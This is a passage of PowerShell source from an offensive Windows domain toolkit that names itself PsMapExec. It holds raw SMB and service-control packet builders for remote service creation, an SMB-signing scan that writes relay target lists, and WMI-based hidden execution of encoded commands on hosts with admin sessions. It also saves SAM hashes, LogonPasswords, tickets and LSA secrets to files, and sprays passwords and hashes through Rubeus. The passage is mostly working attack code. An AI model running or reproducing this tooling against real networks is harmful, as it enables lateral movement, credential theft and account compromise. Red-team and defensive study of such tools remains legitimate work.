        $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
        $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
        $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
        $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
        $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
        $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
        $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
        $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

        if($packet_data.Length)
        {
            $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
        }

        return $packet_RPCRequest
    }

    #SCM

    function Get-PacketSCMOpenSCManagerW()
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00

        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
        return $packet_SCMOpenSCManagerW
    }

    function Get-PacketSCMCreateServiceW()
    {
        param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
                [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
        $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID += 0x00,0x00

        $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",$packet_referent_ID)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",$packet_command)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SCMCreateServiceW
    }

    function Get-PacketSCMStartServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SCMStartServiceW
    }

    function Get-PacketSCMDeleteServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCMDeleteServiceW
    }

    function Get-PacketSCMCloseServiceHandle()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCM_CloseServiceW
    }

    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
    $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
    $process_ID = $process_ID -replace "-00-00",""
    [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    function Get-SMBSigningStatus
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version)

        if($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_client_receive = New-Object System.Byte[] 1024
        $SMB_client_stage = 'NegotiateSMB'
        
        :SMB_relay_challenge_loop while($SMB_client_stage -ne 'exit')
        {
        
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_version = 'SMB1'
                        $SMB_client_stage = 'NTLMSSPNegotiate'
                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'
                    }

                    if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03'))
                    {
                        $SMBSigningStatus = $true
                        
                    } else {
                        $SMBSigningStatus = $false
                    }
                    $SMB_relay_socket.Close()
                    $SMB_client_receive = $null
                    $SMB_client_stage = 'exit'

                }
            
            }

        }
        return $SMBSigningStatus
    }

    if($Target) {
        $Targets += $Target
    }
    foreach ($Target in $Targets) {
        $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
        $SMB_relay_socket.Client.ReceiveTimeout = 3000
        $SMB_relay_socket.Connect($Target,"445")
        $HTTP_client_close = $false
        if(!$SMB_relay_socket.connected)
        {
        "$Target is not responding"
        }
        $SigningStatus = Get-SMBSigningStatus $SMB_relay_socket 'smb2'
        if ($SigningStatus){
            "Signing Enabled"
        } else {
            "Signing Not Required"
        }
        if ($Delay) {
            $Jitter = get-random -Minimum 0 -Maximum $DelayJitter
            sleep ($Delay+$Jitter)
        }
    }

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

Function GenRelayList {
    
    Write-Host
    $ErrorActionPreference = "SilentlyContinue"
    Get-SMBSigning
    
    foreach ($Computer in $Computers) {
    $OS = $computer.Properties["operatingSystem"][0]
    $ComputerName = $computer.Properties["dnshostname"][0]

$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {continue}   elseif ($Connected){

        if ($Method -eq "GenRelayList") {
            $Signing = Get-SMBSigning -Target $ComputerName

            if ($Signing -match "Signing Enabled") {
                if ($SuccessOnly) {
                    continue
                } elseif (!$SuccessOnly) {
                    Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                }
            }

            if ($Signing -match "Signing Not Required") {
                $ComputerName | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append
                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
            }
        }

        if ($Method -eq "GenRelayList") {
            $SigningUnique = Get-Content -Path "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique | Sort
            Set-Content -Value $SigningUnique -Path "$SMB\SigningNotRequired-$Domain.txt" -Force
        }
    }
}

}

################################################################################################################
############################################ Function: SessionHunter ###########################################
################################################################################################################
Function Invoke-SessionHunter {
Write-host

Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)

    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if (!$connected) {return}
    
    $osInfo = $null
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
    if (!$osInfo){return}


    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)


function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    function SessionHunter {
        param($ComputerName, $Command)

        $userSIDs = @()
        $domainCache = @{}
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $adminPresent = $false

        function GetDomainFQDNFromSID {
            param($sid)
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
            $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
            if (-not $domainCache[$objDomain]) {
                try {
                    $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                    $domainCache[$objDomain] = $FQDN
                } catch {
                    return $objDomain
                }
            }
            return $domainCache[$objDomain]
        }

        try {
            $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        } catch {
            return
        }

        $userKeys = $remoteRegistry.GetSubKeyNames()

        foreach ($key in $userKeys) {
            if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                $userSIDs += $key
            }
        }

        $remoteRegistry.Close()

        foreach ($sid in $userSIDs) {
            try {
                $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                $username = $userTranslation.Value.Split('\')[1]
                
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $adminPresent = $true
                    break
                }
            } catch {}
        }

        if ($adminPresent) {
            if ($Command -eq ""){
            # We can just return as OSinfo was checked earlier in script
            return "Successful connection PME"
            
            }
            elseif ($Command -ne ""){

            return WMI $ComputerName -command $Command
            
            }
        }

    }

   SessionHunter -ComputerName $computerName -command $Command

}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SessionHunter " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })



# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################## Function: Spray #############################################
################################################################################################################
Function Spray {
Write-host

if (!$EmptyPassword -and !$AccountAsPassword -and $Hash -eq "" -and $Password -eq ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "We need something to spray"
Write-Host
Write-host "PsMapExec -Method Spray -Password [Password]"
Write-host "PsMapExec -Method Spray -Hash [Hash]"
Write-host "PsMapExec -Method Spray -AccountAsPassword"
Write-host "PsMapExec -Method Spray -EmptyPassword"
return
}

if ($Hash -ne "" -and $Password -ne ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Hash and Password detected"
return
}

if ($EmptyPassword -and $Hash -ne "" -or ($EmptyPassword -and $Password -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return
}

if ($AccountAsPassword -and $Hash -ne "" -or ($AccountAsPassword -and $Password -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return
}

if ($AccountAsPassword -and $EmptyPassword){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
return
}

    

            
# Create a directory entry for the specified domain
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
$searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

# Set the filter to query the domainDNS object
$searcher.Filter = "(objectClass=domainDNS)"
$domainObject = $searcher.FindOne()

if ($domainObject.Properties.Contains("lockoutThreshold")) {
    $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
    # Check the lockout threshold value
    $LO_threshold = $lockoutThreshold

    if ($LO_threshold -eq "0") {
        $SafeLimit = 100000
    } elseif ($LO_threshold -lt 3) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Lockout threshold is 2 or less. Aborting..."
        return
    } elseif ($LO_threshold -lt 4) {
        $SafeLimit = 1
    } else {
        $SafeLimit = $LO_threshold - 2
    }
} else {
            Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Threshold not found. Aborting..."
    return
}

$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

# Display the $SafeLimit value
Write-Output " - Lockout Threshold  : $LO_threshold"
Write-Output " - Safety Limit value : $SafeLimit"
Write-Output " - Removed disabled accounts from spraying"

if ($Hash -ne ""){
    Write-Host
    $Password = ""
    $AccountAsPassword = $False

    if ($Hash.Length -ne 32 -and $Hash.Length -ne 64) {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        return
    }

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with Hash value: $Hash"
    Write-Host

}

if ($Password -ne ""){
    $Hash = ""
    $AccountAsPassword = $False

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with password value: $Password"
    Write-Host

}


if ($AccountAsPassword){
    $Hash = ""
    $Password = ""

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying usernames as passwords"
    Write-Host
}

if ($EmptyPassword){
    $Password = ""
    $Hash = ""
    $AccountAsPassword = $False     
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying empty passwords"
    Write-Host
}


foreach ($UserToSpray in $EnabledDomainUsers){
		$Delay = Get-Random -Minimum 8 -Maximum 90
		Start-Sleep -Milliseconds $Delay
 
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
$searchResult = $searcher.FindOne()
        $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

            if ($badPwdCount -ge $SafeLimit){
                if (!$SuccessOnly){
                    Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Safe threshold met"
                    continue
    }
}
           # Hash Spraying
            if ($Hash -ne ""){
            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
            elseif ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
            
            # Check for Unhandled Rubeus exception
            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }    
            } 
            # Check for KDC_ERR_PREAUTH_FAILED
            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
